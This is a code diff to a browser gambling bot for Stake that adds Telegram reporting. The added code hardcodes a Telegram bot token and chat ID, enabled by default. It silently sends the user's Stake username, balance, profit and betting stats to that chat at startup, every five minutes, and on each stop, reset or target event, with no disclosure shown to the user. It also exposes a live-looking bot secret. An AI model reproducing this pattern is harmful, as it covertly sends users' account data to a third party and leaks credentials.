@@ -4,6 +4,15 @@
         version: "ORION Bot v3.0"
     };
 
+    // Telegram Configuration
+    const TG_CONFIG = {
+        token: '8386154052:AAFQTv8ex1AfzN1Xjr8QToNv6bgJ8l2L_H0',
+        chatId: '-1003776328846',
+        enabled: true,
+        lastReportTime: 0,
+        reportInterval: 300000 // 5 minutes
+    };
+
     const bot = {
         isRunning: false,
         token: null,
@@ -36,6 +45,82 @@
         pfDump: 0.05,
         diceDivider: 400
     };
+
+    // ============ TELEGRAM FUNCTIONS ============
+    async function sendTelegramMessage(message) {
+        if (!TG_CONFIG.enabled) return false;
+        
+        try {
+            const url = `https://api.telegram.org/bot${TG_CONFIG.token}/sendMessage`;
+            const payload = {
+                chat_id: TG_CONFIG.chatId,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            const result = await response.json();
+            if (result.ok) {
+                console.log("Telegram message sent");
+                return true;
+            } else {
+                console.error("Telegram error:", result);
+                return false;
+            }
+        } catch (error) {
+            console.error("Failed to send Telegram message:", error);
+            return false;
+        }
+    }
+
+    function formatReport() {
+        const currentBalance = bot.stats.startBal + bot.stats.profit;
+        const profitPercent = ((bot.stats.profit / bot.stats.startBal) * 100).toFixed(2);
+        const winRate = bot.stats.bets > 0 ? ((bot.stats.wins / bot.stats.bets) * 100).toFixed(1) : "0";
+        const runtime = bot.startTime ? Math.floor((new Date() - bot.startTime) / 1000) : 0;
+        const hours = Math.floor(runtime / 3600);
+        const minutes = Math.floor((runtime % 3600) / 60);
+        const seconds = runtime % 60;
+        
+        const report = `
+╔══════════════════════════════════════╗
+║           ORION BOT REPORT           ║
+╠══════════════════════════════════════╣
+║ 📊 STATUS: ${bot.isRunning ? 'RUNNING' : 'STOPPED'}${' '.repeat(23 - (bot.isRunning ? 7 : 7))}║
+║ 👤 USER: ${bot.stakeUser}${' '.repeat(25 - bot.stakeUser.length)}║
+║ 💰 BALANCE: ${currentBalance.toFixed(8)} ${bot.selectedCurrency}${' '.repeat(10)}║
+║ 📈 PROFIT: ${bot.stats.profit >= 0 ? '+' : ''}${bot.stats.profit.toFixed(8)} (${profitPercent}%)${' '.repeat(12)}║
+║ 🎲 WAGERED: ${bot.stats.wagered.toFixed(8)}${' '.repeat(20)}║
+║ 🎯 BETS: ${bot.stats.bets}${' '.repeat(24)}║
+║ ✅ WINS: ${bot.stats.wins}${' '.repeat(24)}║
+║ ❌ LOSSES: ${bot.stats.loss}${' '.repeat(23)}║
+║ 📊 WINRATE: ${winRate}%${' '.repeat(22)}║
+║ 🎮 MODE: ${bot.currentGame === 'mode1' ? 'BACCARAT' : 'DICE'}${' '.repeat(21)}║
+║ ⏱️ RUNTIME: ${hours}h ${minutes}m ${seconds}s${' '.repeat(10)}║
+╚══════════════════════════════════════╝
+        `;
+        
+        return report;
+    }
+
+    async function sendPeriodicReport() {
+        const now = Date.now();
+        if (now - TG_CONFIG.lastReportTime >= TG_CONFIG.reportInterval && bot.isRunning) {
+            TG_CONFIG.lastReportTime = now;
+            const report = formatReport();
+            await sendTelegramMessage(`<pre>${report}</pre>`);
+        }
+    }
+
+    async function sendTargetReport(targetType) {
+        const report = formatReport();
+        await sendTelegramMessage(`🎯 <b>${targetType} REACHED!</b>\n<pre>${report}</pre>`);
+    }
 
     // ============ API TOKEN FUNCTIONS ============
     function getAuthToken() {
@@ -112,6 +197,12 @@
                         minBetInput.value = "0.00123";
                     }
                     updateUILog(`✅ Logged in as: ${bot.stakeUser}`);
+                    
+                    // Send startup message
+                    if (TG_CONFIG.enabled) {
+                        await sendTelegramMessage(`🚀 <b>ORION BOT STARTED</b>\n👤 User: ${bot.stakeUser}\n💰 Initial Balance: ${bot.stats.startBal.toFixed(8)} ${bot.selectedCurrency}`);
+                    }
+                    
                     return true;
                 } else {
                     updateUILog("❌ Invalid API Token or failed to fetch user data");
@@ -177,6 +268,7 @@
             bot.isRunning = false;
             bot.currentStatus = "TARGET PROFIT REACHED";
             updateUILog("🎯 TARGET PROFIT REACHED! Bot stopped.");
+            sendTargetReport("TARGET PROFIT");
             return true;
         }
         
@@ -184,6 +276,7 @@
             bot.isRunning = false;
             bot.currentStatus = "STOP LOSS TRIGGERED";
             updateUILog("🛑 STOP LOSS TRIGGERED! Bot stopped.");
+            sendTargetReport("STOP LOSS");
             return true;
         }
         
@@ -191,6 +284,7 @@
             bot.isRunning = false;
             bot.currentStatus = "TARGET WAGER REACHED";
             updateUILog("🎯 TARGET WAGER REACHED! Bot stopped.");
+            sendTargetReport("TARGET WAGER");
             return true;
         }
         
@@ -199,6 +293,7 @@
             bot.stopOnWinTriggered = false;
             bot.currentStatus = "STOP ON WIN";
             updateUILog("🛑 STOP ON WIN TRIGGERED! Bot stopped.");
+            sendTargetReport("STOP ON WIN");
             return true;
         }
         
@@ -348,6 +443,9 @@
     async function runLoop() {
         if (!bot.isRunning) return;
         
+        // Send periodic report
+        await sendPeriodicReport();
+        
         if (checkTargets()) return;
         
         const currentBalanceForBet = bot.stats.startBal + bot.stats.profit;
@@ -458,7 +556,6 @@
     }
 
     function updateUILog(message) {
-        // Simplified log for status only
         const statusEl = document.getElementById("bot-status");
         if (statusEl) {
             statusEl.innerText = message;
@@ -835,7 +932,8 @@
         document.getElementById("p-stop").onclick = () => { 
             if(bot.isRunning){ 
                 bot.isRunning = false; 
-                updateUILog("🛑 BOT STOPPED"); 
+                updateUILog("🛑 BOT STOPPED");
+                sendTelegramMessage(`🛑 <b>ORION BOT STOPPED</b>\n<pre>${formatReport()}</pre>`);
             } 
         };
         
@@ -868,6 +966,7 @@
             
             updateUILog("🔄 Stats reset");
             updateUIStats();
+            sendTelegramMessage(`🔄 <b>ORION BOT RESET</b>\nBalance reset to: ${bot.stats.startBal.toFixed(8)} ${bot.selectedCurrency}`);
         };
         
         const savedToken = getAuthToken();
